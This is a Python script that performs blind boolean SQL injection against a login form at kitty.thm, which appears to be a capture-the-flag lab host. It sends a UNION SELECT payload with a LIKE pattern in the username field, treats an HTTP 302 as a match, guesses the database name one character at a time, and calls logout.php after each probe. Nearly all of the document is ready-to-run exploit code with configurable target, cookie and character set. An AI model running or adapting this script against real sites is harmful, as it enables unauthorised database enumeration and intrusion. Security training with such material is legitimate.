#!/usr/bin/env python3
# enum_dbname_with_logout.py
# Blind DB name enumeration by checking HTTP status (302 == match)
# After each probe request, perform GET /logout.php on the same host.

import requests
import time
import sys
from urllib.parse import urljoin
from requests.exceptions import RequestException

# === Configuration ===
TARGET_URL = "http://kitty.thm/index.php"   # POST endpoint (full URL)
COOKIE_VALUE = "t4ic0s1fnma6j8pjobipfbucgf" # set your PHPSESSID here
PASSWORD = "aaa"                            # form's password value
USERNAME_PREFIX = "a' UNION SELECT 1,2,3,4 WHERE database() LIKE '{pattern}';-- -"
# pattern is inserted including trailing % (e.g. 'adm%')

# Character set to try (order matters — put most likely first)
CHARSET = "abcdefghijklmnopqrstuvwxyz0123456789_-ABCDEFGHIJKLMNOPQRSTUVWXYZ"

SLEEP_BETWEEN = 0.3   # seconds between requests (be nice / avoid WAF rate limits)
MAX_DBNAME_LEN = 40    # safety cap
LOGOUT_PATH = "/logout.php"  # relative path to call after each probe
ALLOW_REDIRECTS_FOR_LOGOUT = True  # whether to follow redirects on logout GET

# === End configuration ===

HEADERS = {
    "User-Agent": "Mozilla/5.0 (enum-dbname-script)",
    "Content-Type": "application/x-www-form-urlencoded",
}

session = requests.Session()
session.headers.update(HEADERS)
session.cookies.set("PHPSESSID", COOKIE_VALUE)

# compute logout URL from target URL
def logout_url_from_target(target, logout_path):
    # If logout_path is full URL, urljoin will keep it; if relative, it will join to target's base.
    base = target
    # ensure base ends with slash for proper join if necessary
    return urljoin(base, logout_path)

LOGOUT_URL = logout_url_from_target(TARGET_URL, LOGOUT_PATH)

def send_probe(pattern):
    """
    Send a single POST with the username payload where {pattern} already contains the trailing % if needed.
    Returns True if response indicates a match (302), False otherwise.
    Always tries to call logout after the probe (best-effort).
    Retries a few times on network error.
    """
    data = {
        "username": USERNAME_PREFIX.format(pattern=pattern),
        "password": PASSWORD
    }
    tries = 3
    for attempt in range(tries):
        try:
            # do not allow requests to automatically follow redirects so we can observe 302 directly
            resp = session.post(TARGET_URL, data=data, allow_redirects=False, timeout=10)
            is_match = (resp.status_code == 302)
            # Optionally, if you want to ensure Location contains 'welcome.php':
            # is_match = (resp.status_code == 302 and 'welcome.php' in resp.headers.get('Location',''))

            # After probe, perform logout GET (best-effort). We don't want logout failures to stop enumeration.
            try:
                logout_resp = session.get(LOGOUT_URL, allow_redirects=ALLOW_REDIRECTS_FOR_LOGOUT, timeout=10)
                # Debug:
                # print(f"[DEBUG] logout status={logout_resp.status_code} len={len(logout_resp.text)}")
            except RequestException as e:
                print(f"[!] Logout GET failed (ignored): {e}", file=sys.stderr)

            return is_match
        except RequestException as e:
            print(f"[!] Network error on attempt {attempt+1}: {e}", file=sys.stderr)
            time.sleep(1)
    raise RuntimeError("Network failure: all retries failed")

def enumerate_dbname():
    dbname = ""
    pos = 1
    print("[*] Starting blind DB name enumeration (will call logout after each probe)")
    print(f"[*] Target POST: {TARGET_URL}")
    print(f"[*] Logout URL: {LOGOUT_URL}")
    while pos <= MAX_DBNAME_LEN:
        found_char = None
        for ch in CHARSET:
            test_pattern = f"{dbname + ch}%"
            try:
                print(test_pattern)
                match = send_probe(test_pattern)
            except RuntimeError as e:
                print("[!] Aborting due to network errors.", file=sys.stderr)
                return dbname
            if match:
                dbname += ch
                found_char = ch
                print(f"[+] Found char #{pos}: '{ch}' -> dbname so far: '{dbname}'")
                time.sleep(SLEEP_BETWEEN)
                break
            else:
                # no match for this char, continue trying charset
                time.sleep(SLEEP_BETWEEN)
        if not found_char:
            # no character in CHARSET matched at this position -> assume end of name
            print("[*] No char found at position", pos, "- assuming end of DB name.")
            break
        pos += 1
    print("[*] Enumeration finished. DB name:", repr(dbname))
    return dbname

if __name__ == "__main__":
    try:
        name = enumerate_dbname()
    except KeyboardInterrupt:
        print("\n[!] Interrupted by user")
        sys.exit(1)
